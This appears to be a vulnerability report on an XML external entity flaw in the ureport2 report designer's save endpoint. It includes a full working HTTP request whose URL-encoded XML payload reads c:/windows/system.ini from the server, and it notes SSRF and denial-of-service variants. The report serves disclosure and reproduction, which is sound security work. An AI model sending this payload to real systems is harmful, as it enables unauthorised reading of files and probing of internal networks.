Ureport2 XXE


The interface for saving reports does not disable external entity parsing when parsing xml data, resulting in the possibility of submitting malicious data for injection of xml external entities, reading arbitrary files in the operating system, and causing ssrf to detect intranet information by writing a large number of cyclically called entities Carry out dos attacks, etc.

The vulnerable code  at file：ureport2-core-2.2.9.jar   method：com.bstek.ureport.parser.ReportParser.parse
as the picture：
![image](https://user-images.githubusercontent.com/20945826/212481354-aba5deba-8e47-4a79-9e14-16850ff0ff16.png)

It is found that the program directly reads the xml information, and it is not configured to prohibit external entity references, resulting in xxe

Reproduce the local build environment:
Use idea to build a Springboot demo project and introduce ureport2：

![image](https://user-images.githubusercontent.com/20945826/212481453-6dd7ba4e-995c-4b12-88cb-01f6168c6e5e.png)

Exploiting the Vulnerability

save a report
![image](https://user-images.githubusercontent.com/20945826/212481525-11a0137f-ecf4-44ba-97ed-ef151aef9651.png)

the http message：
![image](https://user-images.githubusercontent.com/20945826/212481596-ad365ac0-47a3-4766-8b35-80f4045aabe5.png)

now add the xxe payload to post program 'content'
the xml content with payload：
![image](https://user-images.githubusercontent.com/20945826/212481879-cba0fc9b-b00f-42b8-9382-251f87989b8c.png)


    
submit data,the http message:
![image](https://user-images.githubusercontent.com/20945826/212482020-d7abe2b9-df61-4b59-a675-b80ca783df6f.png)

POST /ureport/designer/saveReportFile HTTP/1.1
Host: 192.168.66.39:8881
Content-Length: 3936
Accept: */*
Origin: http://192.168.66.39:8881
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://192.168.66.39:8881/ureport/designer
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=F988AAC7F0ED6210948EE2DB114A8A86
Connection: close

file=file%3Atets1.ureport.xml&content=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE+x+%5B+%3C!ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fsystem.ini%22%3E%5D%3E%3Cureport%3E%3Ccell+expand%3D%22None%22+name%3D%22A1%22+row%3D%221%22+col%3D%221%22%3E%3Ccell-style+font-size%3D%2210%22+align%3D%22center%22+valign%3D%22middle%22%3E%3C%2Fcell-style%3E%3Csimple-value%3E%3C!%5BCDATA%5B%5D%5D%3E%3C%2Fsimple-value%3E%3C%2Fcell%3E%3Ccell+expand%3D%22None%22+name%3D%22B1%22+row%3D%221%22+col%3D%222%22%3E%3Ccell-style+font-size%3D%2210%22+align%3D%22center%22+valign%3D%22middle%22%3E%3C%2Fcell-style%3E%3Csimple-value%3E%3C!%5BCDATA%5B%5D%5D%3E%3C%2Fsimple-value%3E%3C%2Fcell%3E%3Ccell+expand%3D%22None%22+name%3D%22C1%22+row%3D%221%22+col%3D%223%22%3E%3Ccell-style+font-size%3D%2210%22+align%3D%22center%22+valign%3D%22middle%22%3E%3C%2Fcell-style%3E%3Csimple-value%3E%3C!%5BCDATA%5B%5D%5D%3E%3C%2Fsimple-value%3E%3C%2Fcell%3E%3Ccell+expand%3D%22None%22+name%3D%22D1%22+row%3D%221%22+col%3D%224%22%3E%3Ccell-style+font-size%3D%2210%22+align%3D%22center%22+valign%3D%22middle%22%3E%3C%2Fcell-style%3E%3Csimple-value%3E%3C!%5BCDATA%5B%5D%5D%3E%3C%2Fsimple-value%3E%3C%2Fcell%3E%3Ccell+expand%3D%22None%22+name%3D%22A2%22+row%3D%222%22+col%3D%221%22%3E%3Ccell-style+font-size%3D%2210%22+align%3D%22center%22+valign%3D%22middle%22%3E%3C%2Fcell-style%3E%3Csimple-value%3E%3C!%5BCDATA%5B%5D%5D%3E%3C%2Fsimple-value%3E%3C%2Fcell%3E%3Ccell+expand%3D%22None%22+name%3D%22B2%22+row%3D%222%22+col%3D%222%22%3E%3Ccell-style+font-size%3D%2210%22+align%3D%22center%22+valign%3D%22middle%22%3E%3C%2Fcell-style%3E%3Csimple-value%3E%3C!%5BCDATA%5B%5D%5D%3E%3C%2Fsimple-value%3E%3C%2Fcell%3E%3Ccell+expand%3D%22None%22+name%3D%22C2%22+row%3D%222%22+col%3D%223%22%3E%3Ccell-style+font-size%3D%2210%22+align%3D%22center%22+valign%3D%22middle%22%3E%3C%2Fcell-style%3E%3Csimple-value%3E%3C!%5BCDATA%5B%5D%5D%3E%3C%2Fsimple-value%3E%3C%2Fcell%3E%3Ccell+expand%3D%22None%22+name%3D%22D2%22+row%3D%222%22+col%3D%224%22%3E%3Ccell-style+font-size%3D%2210%22+align%3D%22center%22+valign%3D%22middle%22%3E%3C%2Fcell-style%3E%3Csimple-value%3E%3C!%5BCDATA%5B%5D%5D%3E%3C%2Fsimple-value%3E%3C%2Fcell%3E%3Ccell+expand%3D%22None%22+name%3D%22A3%22+row%3D%223%22+col%3D%221%22%3E%3Ccell-style+font-size%3D%2210%22+align%3D%22center%22+valign%3D%22middle%22%3E%3C%2Fcell-style%3E%3Csimple-value%3E%3C!%5BCDATA%5B%5D%5D%3E%3C%2Fsimple-value%3E%3C%2Fcell%3E%3Ccell+expand%3D%22None%22+name%3D%22B3%22+row%3D%223%22+col%3D%222%22%3E%3Ccell-style+font-size%3D%2210%22+align%3D%22center%22+valign%3D%22middle%22%3E%3C%2Fcell-style%3E%3Csimple-value%3E%3C!%5BCDATA%5B%5D%5D%3E%3C%2Fsimple-value%3E%3C%2Fcell%3E%3Ccell+expand%3D%22None%22+name%3D%22C3%22+row%3D%223%22+col%3D%223%22%3E%3Ccell-style+font-size%3D%2210%22+align%3D%22center%22+valign%3D%22middle%22%3E%3C%2Fcell-style%3E%3Csimple-value%3E%3C!%5BCDATA%5B%5D%5D%3E%3C%2Fsimple-value%3E%3C%2Fcell%3E%3Ccell+expand%3D%22None%22+name%3D%22D3%22+row%3D%223%22+col%3D%224%22%3E%3Ccell-style+font-size%3D%2210%22+align%3D%22center%22+valign%3D%22middle%22%3E%3C%2Fcell-style%3E%3Csimple-value%3E%26xxe%3B%3C%2Fsimple-value%3E%3C%2Fcell%3E%3Crow+row-number%3D%221%22+height%3D%2218%22%2F%3E%3Crow+row-number%3D%222%22+height%3D%2218%22%2F%3E%3Crow+row-number%3D%223%22+height%3D%2218%22%2F%3E%3Ccolumn+col-number%3D%221%22+width%3D%2280%22%2F%3E%3Ccolumn+col-number%3D%222%22+width%3D%2280%22%2F%3E%3Ccolumn+col-number%3D%223%22+width%3D%2280%22%2F%3E%3Ccolumn+col-number%3D%224%22+width%3D%2280%22%2F%3E%3Cpaper+type%3D%22A4%22+left-margin%3D%2290%22+right-margin%3D%2290%22%0A++++top-margin%3D%2272%22+bottom-margin%3D%2272%22+paging-mode%3D%22fitpage%22+fixrows%3D%220%22%0A++++width%3D%22595%22+height%3D%22842%22+orientation%3D%22portrait%22+html-report-align%3D%22left%22+bg-image%3D%22%22+html-interval-refresh-value%3D%220%22+column-enabled%3D%22false%22%3E%3C%2Fpaper%3E%3C%2Fureport%3E

now open the report we can get the file content at c:/windows/system.ini
![image](https://user-images.githubusercontent.com/20945826/212482215-48d96b63-15b4-4b8a-a222-1f4b2e8c7998.png)

It should also be noted that，the function has no access control so it can be accessed by any user.

And for more, An XML External Entity (XXE) can also cause ssrf and dos
ssrf:
![image](https://user-images.githubusercontent.com/20945826/219539462-498cd482-6893-4328-881f-a3b69fc340a7.png)

